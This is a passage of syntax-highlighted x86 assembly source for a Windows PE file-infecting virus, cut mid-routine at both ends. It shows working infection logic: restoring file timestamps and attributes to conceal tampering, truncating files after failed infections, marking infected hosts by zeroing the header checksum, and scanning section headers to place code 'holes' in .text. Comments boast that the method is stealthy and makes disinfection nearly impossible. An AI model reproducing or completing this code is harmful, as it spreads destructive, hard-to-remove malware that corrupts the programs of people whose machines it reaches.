                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; Set "ERROR" flag</span><span class="sc0">

    </span><span class="sc5">@@NoError</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; Close the file mapping</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc1">; APICALL_BEGIN</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MappingAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_UnmapViewOfFile</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; APICALL_END</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NoError3</span><span class="sc0">

     </span><span class="sc1">;; We jump here if we failed while mapping a view of the file in memory</span><span class="sc0">
     </span><span class="sc5">@@Error3</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; Set "ERROR" flag</span><span class="sc0">
     </span><span class="sc5">@@NoError3</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; Close the handle of the file mapping</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc1">; APICALL_BEGIN</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hMapping</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_CloseHandle</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; APICALL_END</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NoError2</span><span class="sc0">

    </span><span class="sc1">;; Jump here if we failed while creating a file mapping object</span><span class="sc0">
    </span><span class="sc5">@@Error2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; Set "ERROR" flag</span><span class="sc0">
    </span><span class="sc5">@@NoError2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; Let's truncate the file: we set it</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">          </span><span class="sc1">; to the original size again if we</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">          </span><span class="sc1">; failed to infect</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; push 0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; push 0</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@ThereWasAnError</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileSize</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@FixSize</span><span class="sc0">
    </span><span class="sc5">@@ThereWasAnError</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OriginalFileSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">@@FixSize</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hFile</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_SetFilePointer</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; APICALL_END</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; Truncate the file</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">  </span><span class="sc1">; APICALL_BEGIN</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hFile</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_SetEndOfFile</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; APICALL_END</span><span class="sc0">

   </span><span class="sc5">@@DontFixSize</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; Restore the original file time from</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">          </span><span class="sc1">; the data stored at the FindFile struct</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">  </span><span class="sc1">; APICALL_BEGIN</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindFileData</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hFile</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_SetFileTime</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; APICALL_END</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; Close the file handle</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">  </span><span class="sc1">; APICALL_BEGIN</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hFile</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_CloseHandle</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; APICALL_END</span><span class="sc0">

     </span><span class="sc5">@@Error</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; Restore the file attributes</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">  </span><span class="sc1">; APICALL_BEGIN</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileAttributes</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Addr_FilePath</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_SetFileAttributesA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; APICALL_END</span><span class="sc0">
     </span><span class="sc5">@@Error_</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">TouchFile</span><span class="sc0">       </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">;;; This is the main function to make holes. This function is capable of</span><span class="sc0">
</span><span class="sc1">;;; support two types of holes, being the first situated at .text or CODE</span><span class="sc0">
</span><span class="sc1">;;; section. The code can be easily modified to situate the holes at the end</span><span class="sc0">
</span><span class="sc1">;;; of other sections, but the current action is more stealthy. After this,</span><span class="sc0">
</span><span class="sc1">;;; if we remove .reloc section from the executable, we can't know how the</span><span class="sc0">
</span><span class="sc1">;;; host was before, so disinfection is nearly impossible.</span><span class="sc0">
</span><span class="sc5">PrepareFile</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MappingAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">+</span><span class="sc12">'ZM'</span><span class="sc0">       </span><span class="sc1">; Get the header. If the standard</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Error</span><span class="sc0">             </span><span class="sc1">; win32 executable marks don't</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; exist ("MZ" and "PE") we finish</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">         </span><span class="sc1">; with error (of course)</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Error</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">+</span><span class="sc12">'EP'</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Error</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HeaderAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">58h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get the file checksum at the</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">          </span><span class="sc1">; header. if it's 0, it's already</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error</span><span class="sc0">             </span><span class="sc1">; infected.</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Get the type of executable</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">014Ch</span><span class="sc0">        </span><span class="sc1">; x86?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@IA32</span><span class="sc0">              </span><span class="sc1">; If so, jump to IA-32 infection</span><span class="sc0">

  </span><span class="sc1">;; PE32+ for IA64     ; Reserved for future release (v2)</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Error</span><span class="sc0">  </span><span class="sc1">; Exit and finish</span><span class="sc0">
</span><span class="sc1">; You can think: what's the point of making this check? The reason is that</span><span class="sc0">
</span><span class="sc1">; nowadays is more easy to find a server or a home PC with a FTP or HTTP</span><span class="sc0">
</span><span class="sc1">; server with files to get, and there are many of them that are for other</span><span class="sc0">
</span><span class="sc1">; types of processors, so better if we check the processor type. And, in the</span><span class="sc0">
</span><span class="sc1">; future, we'll have new processors like IA-64 (Itanium) and maybe others.</span><span class="sc0">

  </span><span class="sc1">;; PE32 for x86</span><span class="sc0">
       </span><span class="sc5">@@IA32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Get the number of sections in the</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">    </span><span class="sc1">; executable.</span><span class="sc0">
                </span><span class="sc1">; ECX = Number of sections</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the start address of the</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">    </span><span class="sc1">; sections.</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">StartOfSectionHeaders</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; Initialize the interesting</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RelocHeader</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; sections addresses.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TextHeader</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DataHeader</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc5">@@LoopSections</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get the name of the section in the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; pair EAX-ESI</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'ler.'</span><span class="sc0">      </span><span class="sc1">; Is the name ".reloc"?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LookForCode</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">+</span><span class="sc12">'co'</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@NextSection</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RelocHeader</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">  </span><span class="sc1">; Then, set the address</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NextSection</span><span class="sc0">
        </span><span class="sc5">@@LookForCode</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'xet.'</span><span class="sc0">      </span><span class="sc1">; Is the name ".text"?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LookForCode2</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">+</span><span class="sc12">'t'</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@NextSection</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TextHeader</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc1">; Then, set the address of the</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NextSection</span><span class="sc0">           </span><span class="sc1">; code header</span><span class="sc0">
        </span><span class="sc5">@@LookForCode2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'EDOC'</span><span class="sc0">      </span><span class="sc1">; Is the name "CODE"?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LookForData</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@NextSection</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TextHeader</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc1">; Then set the address of the</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NextSection</span><span class="sc0">           </span><span class="sc1">; code header</span><span class="sc0">
        </span><span class="sc5">@@LookForData</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'tad.'</span><span class="sc0">      </span><span class="sc1">; Is the name ".data"?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LookForData2</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">+</span><span class="sc12">'a'</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@NextSection</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DataHeader</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc1">; Then set the address of the</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NextSection</span><span class="sc0">           </span><span class="sc1">; data header</span><span class="sc0">
        </span><span class="sc5">@@LookForData2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'ATAD'</span><span class="sc0">      </span><span class="sc1">; Is the name "DATA"?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LookForData3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@NextSection</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DataHeader</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc1">; Then set the address of the</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NextSection</span><span class="sc0">           </span><span class="sc1">; data header</span><span class="sc0">
        </span><span class="sc5">@@LookForData3</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc5">@@NextSection</span><span class="sc4">:</span><span class="sc0">
